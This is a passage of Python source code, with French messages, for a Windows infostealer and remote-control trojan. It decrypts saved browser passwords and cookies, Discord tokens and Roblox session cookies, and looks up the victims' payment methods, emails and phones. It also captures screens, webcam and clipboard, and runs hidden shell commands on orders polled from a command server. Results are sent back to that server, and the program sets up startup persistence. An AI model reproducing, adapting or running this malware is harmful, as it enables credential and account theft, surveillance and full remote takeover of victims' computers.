                                all_passwords.append({'browser':'Edge','profile':profile_name,'url':origin_url,'username':username,'password':password})
                conn.close()
                os.unlink(tmp.name)
            except:
                pass
        cookie_db = os.path.join(profile_path, "Network", "Cookies")
        if os.path.exists(cookie_db) and wait_for_file_unlock(cookie_db):
            try:
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cur = conn.cursor()
                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
                if cur.fetchone():
                    current_time = datetime.now(timezone.utc)
                    for host_key, name, encrypted_value, expires_utc, is_secure, is_httponly, same_site in cur.execute(
                        "SELECT host_key, name, CAST(encrypted_value AS BLOB), expires_utc, is_secure, is_httponly, sameSite FROM cookies"):
                        if any(host_key.endswith(domain) for domain in EXCLUDE_DOMAINS):
                            continue
                        if expires_utc and expires_utc != 0:
                            expires_dt = datetime.fromtimestamp(expires_utc / 1000000 - 11644473600, tz=timezone.utc)
                            if expires_dt < current_time:
                                continue
                        else:
                            expires_dt = None
                        cookie_value = None
                        if encrypted_value and encrypted_value[:3] == b'v20':
                            cookie_value = decrypt_v20(encrypted_value, key)
                        if not cookie_value:
                            cookie_value = decrypt_v10(encrypted_value)
                        if cookie_value:
                            all_cookies.append({'browser':'Edge','profile':profile_name,'host':host_key.lstrip('.'),'name':name,'value':cookie_value,'expires':expires_dt.strftime('%Y-%m-%d %H:%M:%S') if expires_dt else 'Session','secure':bool(is_secure),'httponly':bool(is_httponly)})
                conn.close()
                os.unlink(tmp.name)
            except:
                pass
    return {'passwords': all_passwords, 'cookies': all_cookies}

def collect_all_browsers_data():
    all_pw = []
    all_ck = []
    try:
        opera_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable")
        data = extract_chromium_browser('Opera', opera_path)
        all_pw.extend(data['passwords'])
        all_ck.extend(data['cookies'])
    except: pass
    try:
        operagx_path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable")
        data = extract_chromium_browser('Opera GX', operagx_path)
        all_pw.extend(data['passwords'])
        all_ck.extend(data['cookies'])
    except: pass
    try:
        ff = extract_firefox_data()
        all_pw.extend(ff['passwords'])
        all_ck.extend(ff['cookies'])
    except: pass
    try:
        brave = extract_brave_data()
        all_pw.extend(brave['passwords'])
        all_ck.extend(brave['cookies'])
    except: pass
    try:
        edge = extract_edge_data()
        all_pw.extend(edge['passwords'])
        all_ck.extend(edge['cookies'])
    except: pass
    return {'passwords': all_pw, 'cookies': all_ck}

def get_discord_tokens():
    result = []
    checked_tokens = set()
    seen_user_ids = set()
    
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        
        tokens_list = gettokens(path)
        if not tokens_list:
            continue
            
        for token_enc in tokens_list:
            try:
                token_enc = token_enc.replace("\\", "") if token_enc.endswith("\\") else token_enc
                
                key = getkey(path)
                if not key:
                    continue
                    
                try:
                    decrypted_key = win32crypt.CryptUnprotectData(
                        base64.b64decode(key)[5:], None, None, None, 0
                    )[1]
                except:
                    continue
                
                encrypted_token = token_enc.split('dQw4w9WgXcQ:')
                if len(encrypted_token) < 2:
                    continue
                    
                encrypted_token = encrypted_token[1]
                nonce = base64.b64decode(encrypted_token)[3:15]
                ciphertext = base64.b64decode(encrypted_token)[15:]
                
                try:
                    token = AES.new(decrypted_key, AES.MODE_GCM, nonce).decrypt(ciphertext)[:-16].decode()
                except:
                    continue
                
                if token in checked_tokens:
                    continue
                checked_tokens.add(token)
                
                headers = getheaders(token)
                
                try:
                    r = requests.get(
                        'https://discord.com/api/v10/users/@me',
                        headers=headers,
                        timeout=8
                    )
                    if r.status_code != 200:
                        continue
                    user = r.json()
                except:
                    continue
                
                user_id = user.get('id')
                if not user_id or user_id in seen_user_ids:
                    continue
                seen_user_ids.add(user_id)
                
                friends_count = 0
                try:
                    r_friends = requests.get(
                        'https://discord.com/api/v9/users/@me/relationships',
                        headers=headers,
                        timeout=8
                    )
                    if r_friends.status_code == 200:
                        friends_data = r_friends.json()
                        friends_count = len(friends_data) if isinstance(friends_data, list) else 0
                except:
                    pass
                
                guilds_count = 0
                admin_guilds = []
                
                try:
                    r_guilds = requests.get(
                        'https://discordapp.com/api/v6/users/@me/guilds?with_counts=true',
                        headers=headers,
                        timeout=12
                    )
                    if r_guilds.status_code == 200:
                        guilds_data = r_guilds.json()
                        if isinstance(guilds_data, list):
                            guilds_count = len(guilds_data)
                            
                            for guild in guilds_data:
                                if not isinstance(guild, dict):
                                    continue
                                    
                                permissions = guild.get('permissions', 0)
                                
                                if (permissions & 0x8) or (permissions & 0x20):
                                    guild_name = guild.get('name', 'Unknown')
                                    guild_id = guild.get('id', '0')
                                    
                                    member_count = 0
                                    vanity = None

                                    try:
                                        rg = requests.get(
                                            f'https://discord.com/api/v6/guilds/{guild_id}',
                                            headers=headers,
                                            timeout=8
                                        )
                                        if rg.status_code == 200:
                                            gdata = rg.json()
                                            if gdata.get('name'):
                                                guild_name = gdata.get('name')
                                            member_count = gdata.get('approximate_member_count', 0)
                                            vanity = gdata.get('vanity_url_code')
                                    except:
                                        pass

                                    if not member_count:
                                        try:
                                            rg2 = requests.get(
                                                f'https://discord.com/api/v9/guilds/{guild_id}?with_counts=true',
                                                headers=headers,
                                                timeout=8
                                            )
                                            if rg2.status_code == 200:
                                                gdata2 = rg2.json()
                                                member_count = gdata2.get('approximate_member_count', 0)
                                        except:
                                            pass

                                    if not member_count:
                                        try:
                                            rpreview = requests.get(
                                                f'https://discord.com/api/v9/guilds/{guild_id}/preview',
                                                headers=headers,
                                                timeout=8
                                            )
                                            if rpreview.status_code == 200:
                                                pdata = rpreview.json()
                                                member_count = pdata.get('approximate_member_count', 0)
                                        except:
                                            pass

                                    if not member_count:
                                        try:
                                            rwidget = requests.get(
                                                f'https://discord.com/api/v9/guilds/{guild_id}/widget.json',
                                                headers=headers,
                                                timeout=8
                                            )
                                            if rwidget.status_code == 200:
                                                wdata = rwidget.json()
                                                member_count = wdata.get('presence_count', 0)
                                                if not member_count:
                                                    members_list = wdata.get('members', [])
                                                    member_count = len(members_list)
                                        except:
                                            pass

                                    admin_guilds.append({
                                        'name': guild_name,
                                        'id': guild_id,
                                        'member_count': member_count,
                                        'vanity': vanity
                                    })
                except:
                    pass
                
                admin_guilds.sort(key=lambda x: x.get('member_count', 0), reverse=True)
                
                has_nitro = False
                nitro_expiry = None
                try:
                    r_nitro = requests.get(
                        'https://discord.com/api/v9/users/@me/billing/subscriptions',
                        headers=headers,
                        timeout=8
                    )
                    if r_nitro.status_code == 200:
                        nitro_data = r_nitro.json()
                        if isinstance(nitro_data, list) and len(nitro_data) > 0:
                            has_nitro = True
                            try:
                                expiry = nitro_data[0].get("current_period_end")
                                if expiry:
                                    nitro_expiry = datetime.strptime(
                                        expiry, "%Y-%m-%dT%H:%M:%S.%f%z"
                                    ).strftime('%d/%m/%Y at %H:%M:%S')
                            except:
                                nitro_expiry = "Unknown"
                except:
                    pass
                
                available_boosts = 0
                try:
                    r_boosts = requests.get(
                        'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
                        headers=headers,
                        timeout=8
                    )
                    if r_boosts.status_code == 200:
                        boosts_data = r_boosts.json()
                        if isinstance(boosts_data, list):
                            for slot in boosts_data:
                                try:
                                    cooldown = datetime.fromisoformat(
                                        slot.get("cooldown_ends_at", "").replace('Z', '+00:00')
                                    )
                                    if cooldown <= datetime.now(timezone.utc):
                                        available_boosts += 1
                                except:
                                    pass
                except:
                    pass
                
                payment_methods = []
                valid_methods = 0
                try:
                    r_payments = requests.get(
                        'https://discord.com/api/v9/users/@me/billing/payment-sources',
                        headers=headers,
                        timeout=8
                    )
                    if r_payments.status_code == 200:
                        payments_data = r_payments.json()
                        if isinstance(payments_data, list):
                            for pm in payments_data:
                                if pm.get('type') == 1:
                                    payment_methods.append({
                                        'type': 'CreditCard',
                                        'invalid': pm.get('invalid', False)
                                    })
                                    if not pm.get('invalid', False):
                                        valid_methods += 1
                                elif pm.get('type') == 2:
                                    payment_methods.append({
                                        'type': 'PayPal',
                                        'invalid': pm.get('invalid', False)
                                    })
                                    if not pm.get('invalid', False):
                                        valid_methods += 1
                except:
                    pass
                
                avatar = user.get('avatar')
                discriminator = user.get('discriminator', '0')
                if avatar:
                    if avatar.startswith('a_'):
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.gif?size=256"
                    else:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png?size=256"
                else:
                    try:
                        avatar_url = f"https://cdn.discordapp.com/embed/avatars/{int(discriminator) % 5}.png"
                    except:
                        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"
                
                result.append({
                    'token': token,
                    'user_id': user_id,
                    'username': user.get('username', 'Unknown'),
                    'discriminator': discriminator,
                    'avatar_url': avatar_url,
                    'email': user.get('email'),
                    'phone': user.get('phone'),
                    'mfa_enabled': user.get('mfa_enabled', False),
                    'verified': user.get('verified', False),
                    'flags': user.get('flags', 0),
                    'locale': user.get('locale', 'Unknown'),
                    'guilds_count': guilds_count,
                    'friends_count': friends_count,
                    'admin_guilds': admin_guilds,
                    'has_nitro': has_nitro,
                    'nitro_expiry': nitro_expiry,
                    'available_boosts': available_boosts,
                    'payment_methods': payment_methods,
                    'valid_payment_methods': valid_methods,
                    'platform': platform
                })
                
            except Exception:
                continue
    
    return result

def get_roblox_cookie_and_username():
    try:
        profile = os.getenv("USERPROFILE")
        roblox_path = os.path.join(profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
        if not os.path.exists(roblox_path):
            return None
        tmp_dir = os.getenv("TEMP") or os.path.expanduser("~\\AppData\\Local\\Temp")
        dest = os.path.join(tmp_dir, f"rc_{datetime.now():%Y%m%d_%H%M%S}.dat")
        shutil.copy(roblox_path, dest)
        data = None
        try:
            with open(dest, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except:
            pass
        finally:
            if os.path.exists(dest):
                try: os.remove(dest)
                except: pass
        if not data or "CookiesData" not in data:
            return None
        encoded = data["CookiesData"]
        decoded = base64.b64decode(encoded)
        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
        cookies_str = decrypted.decode('utf-8', errors='ignore')
        for line in cookies_str.split(';'):
            line = line.strip()
            if '.ROBLOSECURITY' in line:
                cookie_value = line.split('=', 1)[1].strip() if '=' in line else line.split('.ROBLOSECURITY')[-1].strip()
                parts = cookie_value.split()
                cookie_value = parts[-1] if parts else cookie_value
                if not cookie_value.startswith('_|WARNING:'):
                    continue
                session = requests.Session()
                session.headers.update({
                    "Cookie": f".ROBLOSECURITY={cookie_value}",
                    "User-Agent": "Roblox/WinInet",
                    "Accept": "application/json",
                    "Referer": "https://www.roblox.com/"
                })
                r = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
                if r.status_code == 200:
                    username = r.json().get("name")
                    return {'cookie': cookie_value, 'username': username}
                elif r.status_code in (401, 403):
                    csrf_resp = session.post("https://auth.roblox.com/v2/logout", timeout=6)
                    csrf = csrf_resp.headers.get("x-csrf-token")
                    if csrf:
                        session.headers["x-csrf-token"] = csrf
                        r2 = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
                        if r2.status_code == 200:
                            username = r2.json().get("name")
                            return {'cookie': cookie_value, 'username': username}
                return {'cookie': cookie_value, 'username': None}
        return None
    except:
        return None

def take_screenshot():
    try:
        with mss.mss() as sct:
            monitors = sct.monitors[1:]
            screenshots = []
            for i, mon in enumerate(monitors):
                img = sct.grab(mon)
                img_b64 = base64.b64encode(mss.tools.to_png(img.rgb, img.size)).decode()
                screenshots.append({'monitor': i+1, 'data': img_b64})
            return screenshots
    except:
        return []

def take_webcam_screenshot():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            cap = cv2.VideoCapture(1)
        if not cap.isOpened():
            return {'error': 'Aucune webcam détectée'}
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            return {'error': 'Impossible de capturer la webcam'}
        
        _, buffer = cv2.imencode('.jpg', frame)
        img_b64 = base64.b64encode(buffer).decode()
        return {'data': img_b64}
    except ImportError:
        return {'error': 'OpenCV non installé'}
    except Exception as e:
        return {'error': str(e)}

def get_clipboard_text():
    try:
        return pyperclip.paste()
    except:
        return ""

def list_processes():
    procs = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
        try:
            info = proc.info
            try:
                cpu = proc.cpu_percent(interval=0.1)
            except:
                cpu = info['cpu_percent'] if info['cpu_percent'] is not None else 0.0
            procs.append({
                'pid': info['pid'],
                'name': info['name'] or 'Unknown',
                'cpu_percent': round(cpu, 1) if cpu else 0.0,
                'memory_percent': round(info['memory_percent'], 1) if info['memory_percent'] is not None else 0.0,
                'status': info['status']
            })
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return procs[:200]

def suspend_process(pid):
    try:
        proc = psutil.Process(pid)
        proc.suspend()
        return {'success': True, 'message': f'Processus {pid} suspendu'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def resume_process(pid):
    try:
        proc = psutil.Process(pid)
        proc.resume()
        return {'success': True, 'message': f'Processus {pid} repris'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def kill_process(pid):
    try:
        proc = psutil.Process(pid)
        proc.terminate()
        return {'success': True, 'message': f'Process {pid} terminated'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def execute_powershell(cmd):
    try:
        result = subprocess.run(['powershell', '-Command', cmd], capture_output=True, text=True, timeout=30, shell=True, creationflags=0x08000000)
        return {'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode}
    except Exception as e:
        return {'error': str(e)}

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, shell=True, creationflags=0x08000000)
        return {'stdout': result.stdout, 'stderr': result.stderr, 'returncode': result.returncode}
    except Exception as e:
        return {'error': str(e)}

def list_directory(path=None):
    if not path:
        path = os.path.expanduser("~")
    path = os.path.normpath(path)
    while '\\\\' in path:
        path = path.replace('\\\\', '\\')
    try:
        real_path = os.path.realpath(path)
    except:
        real_path = path
    if not os.path.exists(real_path):
        return {'error': f'Le chemin "{path}" n\'existe pas'}
    if not os.path.isdir(real_path):
        return {'error': f'"{path}" n\'est pas un dossier'}
    try:
        if not os.access(real_path, os.R_OK):
            return {'error': f'Permission refusée pour accéder à "{path}"'}
        items = []
        try:
            dir_contents = os.listdir(real_path)
        except PermissionError:
            return {'error': f'Permission refusée pour lister le contenu de "{path}"'}
        except Exception as e:
            return {'error': f'Erreur lors de la lecture de "{path}": {str(e)}'}
        for item in dir_contents:
            full_path = os.path.join(real_path, item)
            try:
                if os.path.islink(full_path):
                    target = os.readlink(full_path)
                    if not os.path.isabs(target):
                        target = os.path.join(real_path, target)
                    target = os.path.normpath(target)
                    item_type = 'directory' if os.path.isdir(target) else 'file'
                    display_path = target
                else:
                    display_path = full_path
                    item_type = 'directory' if os.path.isdir(full_path) else 'file'
                stat = os.stat(full_path)
                items.append({
                    'name': item,
                    'path': display_path,
                    'type': item_type,
                    'size': stat.st_size if item_type == 'file' else 0,
                    'size_str': format_bytes(stat.st_size) if item_type == 'file' else '',
                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                })
            except PermissionError:
                items.append({
                    'name': item,
                    'path': full_path,
                    'type': 'directory' if os.path.isdir(full_path) else 'file',
                    'size': 0,
                    'size_str': '',
                    'modified': '',
                    'access_denied': True
                })
            except:
                items.append({
                    'name': item,
                    'path': full_path,
                    'type': 'unknown',
                    'size': 0,
                    'size_str': '',
                    'modified': ''
                })
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        parent = os.path.dirname(real_path)
        if parent == real_path or (os.path.splitdrive(real_path)[0] and parent == real_path):
            parent = None
        return {
            'path': real_path,
            'parent': parent,
            'items': items[:500]
        }
    except Exception as e:
        return {'error': str(e)}

def download_file(file_path):
    try:
        if not os.path.exists(file_path):
            return {'error': 'Fichier introuvable'}
        if os.path.isdir(file_path):
            return {'error': 'C\'est un dossier, pas un fichier'}
        file_size = os.path.getsize(file_path)
        if file_size > 50 * 1024 * 1024:
            return {'error': 'Fichier trop volumineux (>50 Mo)'}
        with open(file_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode()
        return {
            'name': os.path.basename(file_path),
            'path': file_path,
            'size': file_size,
            'size_str': format_bytes(file_size),
            'data': file_data
        }
    except Exception as e:
        return {'error': str(e)}

def upload_file(file_path, file_data_b64):
    try:
        file_data = base64.b64decode(file_data_b64)
        os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
        with open(file_path, 'wb') as f:
            f.write(file_data)
        return {
            'success': True,
            'path': os.path.abspath(file_path),
            'size': len(file_data),
            'size_str': format_bytes(len(file_data))
        }
    except Exception as e:
        return {'error': str(e)}
    
def delete_path(path):
    try:
        real_path = os.path.realpath(os.path.normpath(path))
        if not os.path.exists(real_path):
            return {'success': False, 'error': f'Le chemin "{path}" n\'existe pas'}
        if os.path.isfile(real_path) or os.path.islink(real_path):
            os.remove(real_path)
        elif os.path.isdir(real_path):
            shutil.rmtree(real_path)
        else:
            return {'success': False, 'error': f'Type non supporté pour "{path}"'}
        return {'success': True, 'message': f'"{path}" supprimé avec succès'}
    except PermissionError:
        return {'success': False, 'error': f'Permission refusée pour supprimer "{path}"'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def handle_command(command):
    cmd_type = command.get('type')
    params = command.get('params', {})
    
    if cmd_type == 'ping':
        result = {'ping': 'ok', 'timestamp': datetime.now().isoformat()}
    elif cmd_type == 'system_info':
        result = get_system_info()
    elif cmd_type == 'discord_data':
        result = get_discord_tokens()
    elif cmd_type == 'roblox_cookie':
        cookie_info = get_roblox_cookie_and_username()
        result = cookie_info if cookie_info else {'error': 'Aucun cookie trouvé'}
    elif cmd_type == 'browser_passwords':
        data = collect_all_browsers_data()
        result = data['passwords']
    elif cmd_type == 'browser_cookies':
        data = collect_all_browsers_data()
        result = data['cookies']
    elif cmd_type == 'screenshot':
        result = take_screenshot()
    elif cmd_type == 'screenshot_webcam':
        result = take_webcam_screenshot()
    elif cmd_type == 'clipboard':
        result = get_clipboard_text()
    elif cmd_type == 'list_processes':
        result = list_processes()
    elif cmd_type == 'kill_process':
        pid = params.get('pid')
        if pid:
            result = kill_process(pid)
        else:
            result = {'error': 'missing pid'}
    elif cmd_type == 'suspend_process':
        pid = params.get('pid')
        if pid: result = suspend_process(pid)
        else: result = {'error': 'missing pid'}
    elif cmd_type == 'resume_process':
        pid = params.get('pid')
        if pid: result = resume_process(pid)
        else: result = {'error': 'missing pid'}
    elif cmd_type == 'file_explorer':
        path = params.get('path')
        result = list_directory(path)
    elif cmd_type == 'download_file':
        file_path = params.get('path')
        if file_path:
            result = download_file(file_path)
        else:
            result = {'error': 'Chemin requis'}
    elif cmd_type == 'upload_file':
        file_path = params.get('path')
        file_data = params.get('data')
        if file_path and file_data:
            result = upload_file(file_path, file_data)
        else:
            result = {'error': 'Chemin et données requis'}
    elif cmd_type == 'delete_path':
        path = params.get('path')
        if path:
            result = delete_path(path)
        else:
            result = {'error': 'Chemin requis pour la suppression'}
    elif cmd_type == 'execute_ps':
        cmd = params.get('command', '')
        result = execute_powershell(cmd)
    elif cmd_type == 'execute_cmd':
        cmd = params.get('command', '')
        result = execute_cmd(cmd)
    else:
        result = {'error': f'Unknown command: {cmd_type}'}
    return result

def send_heartbeat():
    url = f"{SERVER_URL}/api/heartbeat"
    data = get_system_info()
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            resp = response.json()
            if 'token' in resp:
                set_client_config('token', resp['token'])
            return True
    except:
        pass
    return False

def get_commands():
    token = get_client_config('token')
    headers = {'Authorization': f'Bearer {token}'} if token else {}
    try:
        url = f"{SERVER_URL}/api/commands/{get_machine_id()}"
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json().get('commands', [])
    except:
        pass
    return []

def send_command_result(command_id, result):
    token = get_client_config('token')
    headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'} if token else {}
    try:
        url = f"{SERVER_URL}/api/command_result"
        payload = {
            'machine_id': get_machine_id(),
            'command_id': command_id,
            'result': result
        }
        requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        pass

def heartbeat_loop():
    while True:
        try:
            send_heartbeat()
        except:
            pass
        time.sleep(HEARTBEAT_INTERVAL)

def command_poll_loop():
    while True:
        try:
            commands = get_commands()
            for cmd in commands:
                result = handle_command(cmd)
                send_command_result(cmd.get('id'), result)
        except:
            pass
        time.sleep(COMMAND_POLL_INTERVAL)

# ========== DÉMARRAGE PRINCIPAL ==========
if __name__ == '__main__':
    # Vérification anti-doublon
    try:
        import psutil
        current_pid = os.getpid()
        script_name = os.path.basename(__file__).lower()
        count = 0
        for proc in psutil.process_iter(['pid', 'cmdline']):
            try:
                if proc.info['pid'] == current_pid:
                    count += 1
                    continue
                cmdline = proc.info.get('cmdline') or []
                cmd_str = ' '.join(cmdline).lower()
                if script_name in cmd_str:
                    count += 1
            except:
                pass
        if count > 1:
            sys.exit(0)
    except:
        pass
    
    # Auto-update
    perform_client_update()
    
    # Persistance
    ensure_startup_persistence()
    
    # Premier heartbeat
    send_heartbeat()
    
    # Boucles principales
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_poll_loop, daemon=True).start()
    
    # Maintenir en vie sans console
    try:
        while True:
            time.sleep(60)
    except:
        pass
